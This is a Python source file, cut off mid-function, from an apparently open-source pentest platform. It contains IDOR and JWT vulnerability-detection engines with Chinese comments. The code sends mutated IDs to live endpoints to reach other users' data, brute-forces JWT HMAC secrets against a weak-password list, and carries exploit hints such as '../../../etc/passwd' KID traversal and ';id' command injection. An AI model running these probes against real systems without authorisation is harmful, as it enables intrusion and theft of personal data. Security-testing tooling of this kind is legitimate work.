# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VULNCLAW Authors (see README & LICENSE)
# This file is part of VULNCLAW / pentest_platform.
# Licensed under GNU Affero General Public License v3.0 or later.

# engines/auth_engines.py
"""
合并认证与授权引擎模块
包含：IDOR、JWT、OAuth、Session 四个引擎
修复：
1. IDOREngine.check 返回候选线索（而非恒返回 None）
2. 所有引擎增加 confidence 字段
3. 增加 _get_param_value 辅助方法
"""

import re
import json
import asyncio
import time
import uuid
import base64
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from vulnclaw.core.logger import logger
from vulnclaw.core.payload_pool import PayloadPool
from vulnclaw.core.settings import settings
from vulnclaw.core.utils import async_get, async_post, clean_ai_json
from vulnclaw.engines.base import BaseEngine
from typing import Dict, List, Optional, Tuple


# ============================================================
# 1. IDOREngine（修复版 - 返回候选线索）
# ============================================================

class IDOREngine(BaseEngine):
    """IDOR 越权访问检测引擎 - v3.2 修复版"""

    name = "idor"
    description = "IDOR 越权访问检测引擎 v3.2"

    ID_PARAMS = [
        "id", "user", "user_id", "uid", "uuid", "guid",
        "order", "order_id", "orderid", "invoice", "invoice_id",
        "account", "account_id", "acct", "profile", "profile_id",
        "document", "document_id", "file", "file_id", "image_id",
        "product", "product_id", "category", "category_id",
        "customer", "customer_id", "client", "client_id",
        "employee", "employee_id", "member", "member_id",
        "subscription", "subscription_id", "ticket", "ticket_id",
        "payment", "payment_id", "transaction", "transaction_id",
        "cart", "cart_id", "wishlist", "wishlist_id",
        "address", "address_id", "phone", "phone_id",
        "email", "email_id", "token", "access_token",
        "session", "session_id", "cookie", "cookie_id"
    ]

    ADMIN_KEYWORDS = [
        "/admin", "/manage", "/dashboard", "/root", "/superuser",
        "/administrator", "/system", "/control", "/panel",
        "/console", "/operator", "/staff", "/internal",
        "/moderator", "/supervisor", "/owner", "/ceo"
    ]

    PRIVILEGE_KEYWORDS = [
    'admin',
    'root',
    'superuser',
    'manager',
    'administrator',
    'owner',
    'supervisor',
     'moderator']

    SENSITIVE_PATTERNS = {
        'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
        'phone': r'1[3-9]\d{9}',
        'id_card': r'\d{18}|\d{17}X',
        'credit_card': r'\d{16,19}',
        'jwt': r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
        'aws_key': r'AKIA[0-9A-Z]{16}',
        'internal_ip': r'(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})',
        'password_hash': r'[a-f0-9]{32,64}',
    }

    # ============================================================
    # 修复：check 方法返回候选线索（不再恒返回 None）
    # ============================================================
    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        """
        IDOR 检测入口 - 修复版
        检测 ID 参数并返回候选线索，供 Agent 使用
        """
        # 检查参数是否为 ID 类型
        param_lower = param.lower()
        is_id_param = any(
    id_param == param_lower for id_param in self.ID_PARAMS)

        # 检查参数值是否为 ID 格式
        original_value = self._get_param_value(url, param, parsed_query)
        is_id_value = original_value and self._is_id_value(original_value)

        if is_id_param or is_id_value:
            value = original_value or ""

            # ===== 修复：返回候选线索 =====
            return {
                'url': url,
                'parameter': param,
                'value': value,
                'type': 'IDOR候选参数',
                'severity': 'Info',
                'ai_verdict': '信息',
                'confidence': 'medium',
                'evidence': f'发现 ID 参数 {param}={value}，建议进行越权测试',
                'suggestion': f'使用多个角色测试 {param} 参数的不同值',
                'is_candidate': True,
                'method': 'idor_candidate'
            }

        return None

    def _get_param_value(self, url: str, param: str,
                         parsed_query: str) -> Optional[str]:
        """从 URL 中获取参数值"""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        if not qs and parsed_query:
            qs = parse_qs(parsed_query)
        if param in qs and qs[param]:
            return qs[param][0]
        return None

    def _is_id_value(self, value: str) -> bool:
        """判断值是否为 ID 格式"""
        if re.match(r'^\d+$', value):
            return True
        if re.match(
            r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', value, re.I):
            return True
        if re.match(r'^[0-9a-f]{32,64}$', value, re.I):
            return True
        if re.match(r'^[A-Za-z0-9+/=]+$', value) and len(value) >= 16:
            return True
        return False

    # ============================================================
    # A8: 顺序 ID 相邻越权(BOLA)证明 —— 无凭据场景下的轻量双账号替代
    # 用同一会话访问相邻 ID（id±1 等），若返回属于其它用户的数据则确认越权。
    # 与 scan_with_roles（需多角色会话）互补：本方法不需要第二个账号即可产出 proof。
    # ============================================================
    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        from vulnclaw.core.utils import async_get
        endpoints = kwargs.get("endpoints") or [target]
        findings: List[Dict] = []
        for ep in endpoints:
            if not isinstance(ep, str) or not ep:
                continue
            for param, original in self._extract_id_params(ep):
                mutations = [m for m in self._generate_id_mutations(original)
                             if m not in ("", None) and m != original]
                base = await self._idor_fetch(ep, param, original, session, async_get)
                if base is None:
                    continue
                for mv in mutations[:8]:
                    txt = await self._idor_fetch(ep, param, mv, session, async_get)
                    if not txt:
                        continue
                    if txt.strip() == base.strip():
                        continue
                    if self._idor_other_user(base, txt):
                        findings.append({
                            'url': self._idor_url(ep, param, mv),
                            'parameter': param,
                            'value': original,
                            'mutated_value': mv,
                            'type': 'IDOR/BOLA-顺序ID越权',
                            'severity': 'High',
                            'ai_verdict': '疑似真实漏洞',
                            'confidence': 'medium',
                            'evidence': (
                                f'同一会话访问 {param}={mv} 返回与 {param}={original} '
                                f'不同的有效资源，疑似越权访问他人数据'
                            ),
                            'recommendation': '服务端校验资源属主关系；使用不可预测引用标识；基于会话的访问控制',
                            'method': 'idor_adjacency',
                        })
                        break
        return findings

    def _idor_url(self, ep: str, param: str, value: str) -> str:
        parsed = urlparse(ep)
        qs = parse_qs(parsed.query)
        qs[param] = [value]
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                           parsed.params, urlencode(qs, doseq=True), parsed.fragment))

    async def _idor_fetch(self, ep, param, value, session, async_get) -> Optional[str]:
        try:
            status, text, _ = await async_get(
                self._idor_url(ep, param, value), session=session, timeout=8, no_retry=True)
            if status >= 500:
                return None
            return text or ""
        except Exception:
            return None

    def _idor_other_user(self, base: str, txt: str) -> bool:
        import re as _re
        # 其它用户的 PII 信号：base 中无，或值与 base 不同
        for pat in self.SENSITIVE_PATTERNS.values():
            mb = _re.search(pat, base)
            mt = _re.search(pat, txt)
            if mt and (not mb or mt.group(0) != mb.group(0)):
                return True
        # 不同的 UUID/对象标识
        ub = set(_re.findall(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', base, _re.I))
        ut = set(_re.findall(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', txt, _re.I))
        if ut and ut != ub:
            return True
        return False

    # ============================================================
    # scan_with_roles（深度检测逻辑）
    # ============================================================
    async def scan_with_roles(
        self,
        url: str,
        roles: List[str],
        session_manager,
        **kwargs
    ) -> List[Dict]:
        findings = []
        if len(roles) < 2:
            logger.warning("⚠️ IDOR 检测需要至少 2 个角色")
            return findings

        role_privilege = {}
        for role in roles:
            role_lower = role.lower()
            if any(kw in role_lower for kw in self.PRIVILEGE_KEYWORDS):
                role_privilege[role] = '高权限'
            else:
                role_privilege[role] = '低权限'
        logger.debug(f"   📋 角色权限: {role_privilege}")

        id_params = self._extract_id_params(url)
        if not id_params:
            logger.debug(f"URL 无 ID 参数，跳过 IDOR 检测: {url}")
            return findings

        logger.info(f"🔐 检测 IDOR: {url}，参数: {id_params}")

        for param, original_value in id_params:
            if not original_value:
                continue

            mutations = self._generate_id_mutations(original_value)

            for mutated_value in mutations[:10]:
                try:
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query)
                    qs[param] = [mutated_value]
                    new_query = urlencode(qs, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))

                    responses = await session_manager.compare_requests(
                        test_url, "GET", roles
                    )

                    diff_score = self._compute_diff_score(responses)
                    sensitive_data = self._extract_sensitive_from_responses(
                        responses)

                    if diff_score > 0.2 or sensitive_data:
                        ai_result = await self._ai_verify_idor(
                            test_url, roles, responses, diff_score, sensitive_data,
                            role_privilege
                        )

                        if ai_result.get('is_idor', False):
                            finding = {
                                'url': test_url,
                                'parameter': param,
                                'original_value': original_value,
                                'mutated_value': mutated_value,
                                'type': 'IDOR-越权访问',
                                'severity': ai_result.get('severity', 'High'),
                                'ai_verdict': ai_result.get('confidence', '高'),
                                'confidence': 'high' if ai_result.get('confidence') == '高' else 'medium',
                                'evidence': ai_result.get('evidence', ''),
                                'diff_score': diff_score,
                                'sensitive_data': sensitive_data,
                                'privilege_violation': ai_result.get('privilege_violation', '未知'),
                                'recommendation': ai_result.get('recommendation', '')
                            }
                            findings.append(finding)
                            logger.warning(
    f"🚨 发现 IDOR: {test_url} ({param}={mutated_value})")
                            break

                except Exception as e:
                    logger.debug(f"IDOR 测试异常: {e}")

        return findings

    def _extract_id_params(self, url: str) -> List[Tuple[str, str]]:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        id_params = []

        for param, values in qs.items():
            if not values:
                continue
            value = values[0] if isinstance(values, list) else values
            if not value:
                continue

            param_lower = param.lower()
            if any(id_param == param_lower for id_param in self.ID_PARAMS):
                id_params.append((param, value))
                continue

            if self._is_id_value(value):
                id_params.append((param, value))

        return id_params

    def _generate_id_mutations(self, original_id: str) -> List[str]:
        mutations = []

        if original_id.isdigit():
            try:
                num = int(original_id)
                if num > 1:
                    mutations.append(str(num - 1))
                mutations.append(str(num + 1))
                mutations.append(str(num + 2))
                mutations.append("0")
                mutations.append("1")
                mutations.append("999999")
                mutations.append("999999999")
                mutations.append("null")
                mutations.append("undefined")
                mutations.append("")
                mutations.append(f"{num}a")
                mutations.append(f"a{num}")
            except:
                logger.debug("suppressed exception (engine audit)")

        elif re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', original_id, re.I):
            parts = original_id.split('-')
            last_group = parts[-1]
            if last_group and last_group[-1].isdigit():
                new_last = last_group[:-1] + \
                    str((int(last_group[-1]) + 1) % 10)
                parts[-1] = new_last
                mutations.append('-'.join(parts))
            parts[-2] = '0000'
            mutations.append('-'.join(parts))
            mutations.append('00000000-0000-0000-0000-000000000000')
            mutations.append('ffffffff-ffff-ffff-ffff-ffffffffffff')
            mutations.append(str(uuid.uuid4()))
            mutations.append(original_id[:8])

        elif re.match(r'^[A-Za-z0-9+/=]+$', original_id) and len(original_id) >= 16:
            mutations.append(original_id[:len(original_id) // 2])
            mutations.append(original_id[:-1] + 'A')
            mutations.append(original_id + 'A')
            try:
                padding = 4 - (len(original_id) % 4)
                if padding != 4:
                    decoded = base64.b64decode(original_id + '=' * padding)
                else:
                    decoded = base64.b64decode(original_id)
                if decoded:
                    new_encoded = base64.b64encode(decoded).decode()
                    if new_encoded != original_id:
                        mutations.append(new_encoded)
            except:
                logger.debug("suppressed exception (engine audit)")

        elif re.match(r'^[0-9a-f]{32,64}$', original_id, re.I):
            if original_id[-1].isdigit():
                new_last = str((int(original_id[-1]) + 1) % 10)
                mutations.append(original_id[:-1] + new_last)
            else:
                char_map = {'a': 'b', 'b': 'c', 'c': 'd', 'd': 'e', 'e': 'f'}
                if original_id[-1].lower() in char_map:
                    mutations.append(
                        original_id[:-1] + char_map[original_id[-1].lower()])
            mutations.append(original_id[:16])
            mutations.append(original_id[:8])
            mutations.append('0' * len(original_id))
            mutations.append('f' * len(original_id))

        mutations.append('null')
        mutations.append('undefined')
        mutations.append('')
        mutations.append('0')
        mutations.append('1')
        mutations.append('-1')
        mutations.append('admin')
        mutations.append('root')

        mutations = list(dict.fromkeys(mutations))
        if original_id in mutations:
            mutations.remove(original_id)

        return mutations[:15]

    def _compute_diff_score(
        self, responses: Dict[str, Tuple[int, str, Dict]]) -> float:
        if len(responses) < 2:
            return 0.0

        texts = []
        statuses = []
        lengths = []

        for role, (status, text, headers) in responses.items():
            texts.append(text[:500])
            statuses.append(status)
            lengths.append(len(text))

        unique_statuses = len(set(statuses))
        status_score = min(1.0, (unique_statuses - 1) / 2)

        if lengths and sum(lengths) > 0:
            mean_len = sum(lengths) / len(lengths)
            if mean_len > 0:
                variance = sum(
    (l - mean_len) ** 2 for l in lengths) / len(lengths)
                cv = (variance ** 0.5) / mean_len
                length_score = min(1.0, cv * 2)
            else:
                length_score = 0
        else:
            length_score = 0

        if len(texts) >= 2:
            words_sets = [set(t.split()) for t in texts]
            intersection = words_sets[0]
            union = words_sets[0]
            for s in words_sets[1:]:
                intersection = intersection.intersection(s)
                union = union.union(s)
            if union:
                jaccard = len(intersection) / len(union)
                content_score = 1 - jaccard
            else:
                content_score = 0
        else:
            content_score = 0

        total_score = status_score * 0.3 + length_score * 0.3 + content_score * 0.4
        return min(1.0, total_score)

    def _extract_sensitive_from_responses(
        self,
        responses: Dict[str, Tuple[int, str, Dict]]
    ) -> Dict[str, Dict[str, List[str]]]:
        result = {}
        for role, (status, text, headers) in responses.items():
            if status != 200:
                continue
            sensitive = {}
            for label, pattern in self.SENSITIVE_PATTERNS.items():
                matches = re.findall(pattern, text)
                if matches:
                    sensitive[label] = list(set(matches))[:5]
            if sensitive:
                result[role] = sensitive
        return result

    async def _ai_verify_idor(
        self,
        url: str,
        roles: List[str],
        responses: Dict[str, Tuple[int, str, Dict]],
        diff_score: float,
        sensitive_data: Dict,
        role_privilege: Dict[str, str] = None
    ) -> Dict:
        comparison = []
        for role, (status, text, headers) in responses.items():
            snippet = text[:800]
            sensitive = sensitive_data.get(role, {})
            sensitive_str = json.dumps(
    sensitive, ensure_ascii=False) if sensitive else "无"
            privilege = role_privilege.get(
    role, '未知') if role_privilege else '未知'
            comparison.append(
                f"角色: {role} (权限: {privilege})\n"
                f"状态码: {status}\n"
                f"敏感数据: {sensitive_str}\n"
                f"响应片段: {snippet}\n"
            )

        prompt = f"""
你是一位严谨的安全分析专家。请判断以下是否存在权限绕过（IDOR）漏洞。

目标 URL: {url}
响应差异分数: {diff_score:.2f}（0-1，越高差异越大）

【重要】响应对比中标注了每个角色的权限层级（高权限/低权限）。
判断标准：
1. 如果低权限角色能访问到高权限角色才应有的数据（如 admin 字段、其他用户订单）→ 垂直越权
2. 如果低权限角色能访问其他低权限角色的私有数据 → 水平越权
3. 如果只是不同普通用户的数据差异（如各自查看自己的订单）→ 不是越权
4. 如果所有角色都返回相同的"无权限"页面 → 不是越权

响应对比：
{chr(10).join(comparison)}

输出 JSON：
{{
  "is_idor": true/false,
  "confidence": "高/中/低",
  "severity": "Critical/High/Medium",
  "evidence": "判断依据（50字以内）",
  "privilege_violation": "水平越权/垂直越权/无",
  "recommendation": "修复建议"
}}
"""
        try:
            from vulnclaw.ai.core import get_llm_client
            client = get_llm_client()
            result = await client.ask(
                prompt,
                system="只输出 JSON，不要解释。",
                temperature=0.1,
                wrap_data=True
            )
            cleaned = clean_ai_json(result)
            json_match = re.search(r'\{.*\}', cleaned, re.DOTALL)
            if json_match:
                return json.loads(json_match.group())
        except Exception as e:
            logger.debug(f"AI 验证 IDOR 失败: {e}")

        if diff_score > 0.4 and sensitive_data:
            return {
                "is_idor": True,
                "confidence": "中",
                "severity": "High",
                "evidence": f"响应差异 {diff_score:.1%} 且包含敏感数据，但 AI 分析失败",
                "privilege_violation": "未知",
                "recommendation": "建议手动验证"
            }

        return {"is_idor": False, "confidence": "低",
            "evidence": "AI 分析未确认", "privilege_violation": "无"}

    async def scan_vertical_privilege(
        self,
        base_url: str,
        session_manager,
        roles: List[str]
    ) -> List[Dict]:
        findings = []
        if len(roles) < 2:
            return findings

        role_privilege = {}
        for role in roles:
            role_lower = role.lower()
            if any(kw in role_lower for kw in self.PRIVILEGE_KEYWORDS):
                role_privilege[role] = '高权限'
            else:
                role_privilege[role] = '低权限'

        admin_paths = [
            "/admin", "/admin/", "/admin/dashboard", "/admin/users",
            "/manage", "/manage/", "/manage/users",
            "/dashboard", "/dashboard/", "/dashboard/admin",
            "/console", "/console/", "/console/admin",
            "/panel", "/panel/", "/panel/admin",
            "/administrator", "/administrator/",
            "/system", "/system/", "/system/status",
            "/operator", "/operator/", "/operator/dashboard",
            "/internal", "/internal/", "/internal/admin",
        ]

        for path in admin_paths[:15]:
            test_url = base_url.rstrip('/') + path
            try:
                responses = await session_manager.compare_requests(test_url, "GET", roles)

                [
    r for r, p in role_privilege.items() if p == '低权限']
                accessible = []

                for role, (status, text, headers) in responses.items():
                    if status == 200 and len(text) > 100:
                        admin_indicators = [
    'admin', 'dashboard', 'users', 'manage', 'system', 'config']
                        if any(ind in text.lower()
                               for ind in admin_indicators):
                            accessible.append(role)

                if accessible:
                    low_accessible = [
    r for r in accessible if role_privilege.get(r) == '低权限']
                    if low_accessible:
                        findings.append({
                            'url': test_url,
                            'type': '垂直越权-低权限访问管理路径',
                            'severity': 'High',
                            'ai_verdict': '高',
                            'confidence': 'high',
                            'evidence': f"低权限角色可访问管理路径 {path}: {', '.join(low_accessible)}",
                            'accessible_roles': accessible,
                            'role_privilege': role_privilege,
                            'recommendation': '检查权限中间件配置'
                        })
            except Exception as e:
                logger.debug(f"垂直越权检测异常: {e}")

        return findings


# ============================================================
# 2. JWTEngine（增加 confidence 字段）
# ============================================================

class JWTEngine(BaseEngine):
    """JWT 攻击检测引擎"""

    name = "jwt"
    description = "JWT 攻击检测引擎"

    WEAK_SECRETS = [
        "secret", "secret123", "secretkey", "mysecret", "jwtsecret",
        "password", "password123", "admin", "admin123", "root",
        "123456", "12345678", "123456789", "qwerty", "qwertyuiop",
        "abc123", "test", "test123", "testing", "test123456",
        "letmein", "welcome", "welcome1", "hello", "helloworld",
        "changeme", "default", "default123", "guest", "guest123",
        "1qaz2wsx", "1q2w3e4r", "1q2w3e4r5t", "qwerty123", "qwerty123456",
        "admin@123", "Admin123", "P@ssw0rd", "Passw0rd", "password!@#",
        "toor", "root123", "oracle", "oracle123", "mysql", "mysql123",
        "postgres", "postgres123", "mongodb", "mongodb123", "redis", "redis123",
        "elastic", "elastic123", "kibana", "kibana123", "grafana", "grafana123",
        "jenkins", "jenkins123", "nexus", "nexus123", "sonar", "sonar123",
        "gitlab", "gitlab123", "github", "github123", "bitbucket", "bitbucket123",
        "aws", "aws123", "azure", "azure123", "gcp", "gcp123",
        "docker", "docker123", "kubernetes", "k8s", "k8s123",
        "spring", "spring123", "boot", "boot123", "cloud", "cloud123",
        "microservices", "ms", "ms123", "api", "api123", "gateway", "gateway123",
        "service", "service123", "app", "app123", "web", "web123",
        "dev", "dev123", "test", "test123", "prod", "prod123", "stage", "stage123",
    ]

    JWT_PATTERN = r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'

    SENSITIVE_PAYLOAD_FIELDS = [
        "password", "secret", "key", "api_key", "apikey",
        "token", "access_token", "refresh_token", "auth_token",
        "email", "phone", "mobile", "credit_card", "ssn", "social",
        "address", "zip", "postal", "city", "country",
        "birthday", "age", "gender", "id_card", "passport",
    ]

    PRIVILEGE_FIELDS = [
        "admin", "is_admin", "role", "roles", "permission",
        "permissions", "privilege", "privileges", "level",
        "access", "scope", "scopes", "group", "groups",
        "superuser", "root", "owner", "manager", "moderator"
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        if isinstance(normal_resp, tuple):
            text = normal_resp[1]
            headers = normal_resp[2] if len(normal_resp) > 2 else {}
        else:
            text = await normal_resp.text()
            headers = normal_resp.headers

        tokens = self._extract_jwt_tokens(text, headers)

        if not tokens:
            return None

        findings = []
        for token in tokens:
            analysis = await self._analyze_jwt(token, session)
            if analysis and analysis.get('vulnerabilities'):
                findings.append({
                    'url': url,
                    'type': 'JWT漏洞',
                    'token': token[:20] + '...',
                    'vulnerabilities': analysis.get('vulnerabilities'),
                    'severity': analysis.get('severity', 'Medium'),
                    'ai_verdict': '高' if analysis.get('severity') in ['Critical', 'High'] else '中',
                    'confidence': 'high' if analysis.get('severity') in ['Critical', 'High'] else 'medium',
                    'evidence': analysis.get('evidence', ''),
                    'header': analysis.get('header', {}),
                    'payload': analysis.get('payload', {}),
                })

        if findings:
            findings.sort(
    key=lambda x: {
        'Critical': 0,
        'High': 1,
        'Medium': 2,
        'Low': 3}.get(
            x.get(
                'severity',
                'Low'),
                 4))
            return findings[0]

        return None

    def _extract_jwt_tokens(self, text: str, headers: Dict) -> List[str]:
        tokens = []

        matches = re.findall(self.JWT_PATTERN, text)
        tokens.extend(matches)

        auth_header = headers.get('Authorization', '')
        if 'Bearer ' in auth_header:
            token = auth_header.split(' ')[1].strip()
            if re.match(self.JWT_PATTERN, token):
                tokens.append(token)

        cookie_header = headers.get('Cookie', '')
        if cookie_header:
            for part in cookie_header.split(';'):
                part = part.strip()
                if '=' in part:
                    _, value = part.split('=', 1)
                    if re.match(self.JWT_PATTERN, value):
                        tokens.append(value)

        return list(dict.fromkeys(tokens))

    async def _analyze_jwt(self, token: str, session) -> Dict:
        analysis = {
            'token': token[:20] + '...',
            'header': {},
            'payload': {},
            'vulnerabilities': [],
            'severity': 'Low',
            'evidence': ''
        }
        advanced = self._get_advanced()

        parts = token.split('.')
        if len(parts) != 3:
            analysis['vulnerabilities'].append({
                'type': 'Invalid JWT Format',
                'severity': 'Info',
                'detail': 'JWT 不是 3 段格式'
            })
            return analysis

        try:
            header_padded = parts[0] + '==' * (4 - len(parts[0]) % 4)
            header_json = base64.urlsafe_b64decode(
                header_padded).decode('utf-8', errors='ignore')
            header = json.loads(header_json)
            analysis['header'] = header

            payload_padded = parts[1] + '==' * (4 - len(parts[1]) % 4)
            payload_json = base64.urlsafe_b64decode(
                payload_padded).decode('utf-8', errors='ignore')
            payload = json.loads(payload_json)
            analysis['payload'] = payload

            if header.get('alg') == 'none':
                analysis['vulnerabilities'].append({
                    'type': 'alg: none 算法混淆',
                    'severity': 'Critical',
                    'detail': 'JWT 使用 "none" 算法，可被任意伪造',
                    'exploit': '将 alg 改为 none，去掉签名部分即可伪造 Token'
                })
                analysis['severity'] = 'Critical'

            alg = header.get('alg', '')
            # 算法混淆：payload_pool.yaml -> jwt_advanced.alg_confusion
            alg_conf = advanced.get('alg_confusion') or []
            from_algs = {str(c.get('from')) for c in alg_conf if isinstance(c, dict) and c.get('from')}
            if alg == 'HS256' and 'RS256' in from_algs:
                analysis['vulnerabilities'].append({
                    'type': '算法混淆候选(RS256→HS256)',
                    'severity': 'Medium',
                    'detail': 'JWT 使用 HS256，若服务端预期 RS256，攻击者可用公钥作为 HMAC 密钥伪造 Token',
                    'exploit': '尝试使用服务端 RSA 公钥作为 HS256 密钥伪造 Token'
                })
                if analysis['severity'] == 'Low':
                    analysis['severity'] = 'Medium'
            if alg in ['HS256', 'HS384', 'HS512']:
                weak_secret = await self._try_weak_secret(token, alg, parts)
                if weak_secret:
                    analysis['vulnerabilities'].append({
                        'type': '弱密钥爆破',
                        'severity': 'Critical',
                        'detail': f'JWT 使用弱密钥 "{weak_secret}"，可被伪造',
                        'exploit': f'使用密钥 "{weak_secret}" 即可任意伪造 Token'
                    })
                    analysis['severity'] = 'Critical'
                    analysis['weak_secret'] = weak_secret

            kid = header.get('kid', '')
            if kid:
                kid_lower = kid.lower()
                if '../' in kid_lower or '/etc/passwd' in kid_lower or '..\\' in kid_lower:
                    analysis['vulnerabilities'].append({
                        'type': 'KID 路径注入',
                        'severity': 'High',
                        'detail': f'KID 包含路径遍历特征: {kid}',
                        'exploit': '尝试使用 ../../../etc/passwd 作为 KID 读取文件'
                    })
                    analysis['severity'] = 'High'
                # 高级 payload：payload_pool.yaml -> jwt_advanced.kid_path_traversal
                if not any(v['type'] == 'KID 路径注入' for v in analysis['vulnerabilities']):
                    kid_pool = advanced.get('kid_path_traversal') or []
                    if any(isinstance(p, str) and p and p.lower() in kid_lower for p in kid_pool):
                        analysis['vulnerabilities'].append({
                            'type': 'KID 路径注入',
                            'severity': 'High',
                            'detail': f'KID 命中高级路径遍历特征: {kid}',
                            'exploit': '使用 payload_pool.yaml 中 kid_path_traversal 条目作为 KID 尝试读取文件'
                        })
                        analysis['severity'] = 'High'
                if '|' in kid or ';' in kid or '`' in kid:
                    analysis['vulnerabilities'].append({
                        'type': 'KID 命令注入',
                        'severity': 'High',
                        'detail': f'KID 包含命令注入特征: {kid}',
                        'exploit': '尝试使用 ;id 等命令作为 KID'
                    })
                    analysis['severity'] = 'High'

            jku = header.get('jku', '')
            if jku:
                if 'localhost' in jku or '127.0.0.1' in jku or 'evil' in jku:
                    analysis['vulnerabilities'].append({
                        'type': 'JKU 注入（恶意 JWK Set URL）',
                        'severity': 'High',
                        'detail': f'JKU 指向可疑地址: {jku}',
                        'exploit': '尝试将 JKU 指向攻击者控制的 JWK Set'
                    })
                    analysis['severity'] = 'High'
                # 高级 payload：payload_pool.yaml -> jwt_advanced.jku_injection
                jku_host = urlparse(jku).netloc
                jku_pool = advanced.get('jku_injection') or []
                if jku_host and any(
                    isinstance(p, str) and urlparse(p).netloc == jku_host for p in jku_pool
                ):
                    if not any(v['type'] == 'JKU 注入（恶意 JWK Set URL）'
                               for v in analysis['vulnerabilities']):
                        analysis['vulnerabilities'].append({
                            'type': 'JKU 注入（恶意 JWK Set URL）',
                            'severity': 'High',
                            'detail': f'JKU 主机命中高级 payload 配置: {jku}',
                            'exploit': '尝试将 JKU 指向攻击者控制的 JWK Set'
                        })
                        analysis['severity'] = 'High'

            privilege_found = []
            for field in self.PRIVILEGE_FIELDS:
                if field in payload:
                    value = payload[field]
                    if value is True or str(value).lower() in [
                                            'admin', 'true', '1', 'root', 'superuser']:
                        privilege_found.append(f'{field}={value}')

            if privilege_found:
                analysis['vulnerabilities'].append({
                    'type': 'Claim 注入（特权提升）',
                    'severity': 'High',
                    'detail': f'JWT Payload 包含特权字段: {", ".join(privilege_found)}',
                    'exploit': '修改这些字段的值可以提升权限'
                })
                analysis['severity'] = 'High'

            sensitive_found = []
            for field in self.SENSITIVE_PAYLOAD_FIELDS:
                if field in payload and payload[field]:
                    value = str(payload[field])[:50]
                    sensitive_found.append(f'{field}={value}')

            if sensitive_found:
                analysis['vulnerabilities'].append({
                    'type': '敏感信息泄露',
                    'severity': 'Medium',
                    'detail': f'JWT Payload 包含敏感字段: {", ".join(sensitive_found[:3])}',
                    'exploit': '这些信息可能被用于社会工程或进一步攻击'
                })
                if analysis['severity'] == 'Low':
                    analysis['severity'] = 'Medium'

            exp = payload.get('exp')
            if exp:
                if isinstance(exp, (int, float)):
                    if exp < time.time():
                        analysis['vulnerabilities'].append({
                            'type': 'Token 已过期',
                            'severity': 'Info',
                            'detail': f'JWT 已过期 (exp={time.ctime(exp)})'
                        })
                    elif exp > time.time() + 365 * 24 * 3600:
                        analysis['vulnerabilities'].append({
                            'type': '过期时间过长',
                            'severity': 'Low',
                            'detail': f'JWT 过期时间设置为 {time.ctime(exp)}，超过1年'
                        })
            else:
                analysis['vulnerabilities'].append({
                    'type': '缺少过期时间',
                    'severity': 'Medium',
                    'detail': 'JWT 缺少 exp 字段（无过期时间）'
                })
                if analysis['severity'] == 'Low':
                    analysis['severity'] = 'Medium'

            iat = payload.get('iat')
            if iat and isinstance(iat, (int, float)):
                if iat > time.time() + 3600:
                    analysis['vulnerabilities'].append({
                        'type': '签发时间在未来',
                        'severity': 'Low',
                        'detail': f'JWT 签发时间设置为 {time.ctime(iat)}（在未来）'
                    })

            aud = payload.get('aud')
            if aud and isinstance(aud, str) and 'attacker' in aud.lower():
                analysis['vulnerabilities'].append({
                    'type': '受众篡改',
                    'severity': 'Medium',
                    'detail': f'JWT 受众设置为可疑值: {aud}'
                })

            if analysis['vulnerabilities']:
                vuln_types = [v['type'] for v in analysis['vulnerabilities']]
                vuln_count = len(analysis['vulnerabilities'])
                vuln_summary = ", ".join(vuln_types)
                analysis['evidence'] = f'发现 {vuln_count} 个问题: {vuln_summary}'

        except json.JSONDecodeError as e:
            analysis['vulnerabilities'].append({
                'type': 'JWT 解码失败',
                'severity': 'Info',
                'detail': f'无法解码 JWT: {e}'
            })
        except Exception as e:
            analysis['vulnerabilities'].append({
                'type': 'JWT 分析异常',
                'severity': 'Info',
                'detail': f'分析异常: {e}'
            })

        return analysis

    # ============================================================
    # 修复：_try_weak_secret 方法（删除末尾多余代码）
    # ============================================================
    async def _try_weak_secret(
        self, token: str, alg: str, parts: List[str]) -> Optional[str]:
        try:
            import jwt as jwt_lib
        except ImportError:
            return None

        secrets_to_test = list(self.WEAK_SECRETS)
        secrets_to_test.extend(getattr(self, '_advanced_weak_secrets', []))
        secrets_to_test = list(dict.fromkeys(secrets_to_test))[:50]

        def _decode_sync():
            for secret in secrets_to_test:
                try:
                    decoded = jwt_lib.decode(token, secret, algorithms=[alg])
                    if decoded:
                        return secret
                except Exception:
                    continue
            return None

        return await asyncio.to_thread(_decode_sync)

    # ============================================================
    # 高级 payload：从 payload_pool.yaml 的 jwt_advanced 分类加载
    # ============================================================
    def _load_advanced_payloads(self) -> Dict:
        """从 payload_pool.yaml 的 jwt_advanced 分类加载高级攻击 payload。"""
        try:
            advanced = PayloadPool.get_raw("jwt_advanced") or {}
